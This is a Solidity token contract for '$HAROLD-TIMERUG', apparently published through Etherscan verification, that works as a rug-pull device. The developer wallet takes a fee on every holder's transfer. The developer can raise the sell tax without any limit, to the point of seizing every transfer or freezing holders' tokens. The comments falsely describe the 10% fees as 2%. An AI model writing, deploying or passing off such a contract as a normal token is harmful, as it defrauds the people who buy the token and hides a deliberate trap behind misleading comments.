/**
 *Submitted for verification at Etherscan.io on 2023-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Harold {
    string public name = "$HAROLD-TIMERUG";
    string public symbol = "$HAROLD";
    uint256 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**decimals;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    address public devWallet;
    uint256 public buyTax = 10; // 2% buy tax
    uint256 public sellTax = 10; // 2% sell tax

    constructor() {
        balances[msg.sender] = totalSupply;
        devWallet = msg.sender;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_value <= balances[msg.sender], "ERC20: insufficient balance");

        uint256 fee = 0;
        if (msg.sender != devWallet) {
            fee = _value * sellTax / 100;
            balances[devWallet] += fee;
        }

        balances[msg.sender] -= _value;
        balances[_to] += _value - fee;
        emit Transfer(msg.sender, _to, _value - fee);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_value <= balances[_from], "ERC20: insufficient balance");
        require(_value <= allowed[_from][msg.sender], "ERC20: insufficient allowance");

        uint256 fee = 0;
        if (_from != devWallet) {
            fee = _value * sellTax / 100;
            balances[devWallet] += fee;
        }

        balances[_from] -= _value;
        balances[_to] += _value - fee;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value - fee);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function changeBuyTax(uint256 _newBuyTax) public {
        require(msg.sender == devWallet, "ERC20: only the developer can change the buy tax");
        buyTax = _newBuyTax;
    }

    function changeSellTax(uint256 _newSellTax) public {
        require(msg.sender == devWallet, "ERC20: only the developer can change the sell tax");
        sellTax = _newSellTax;
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}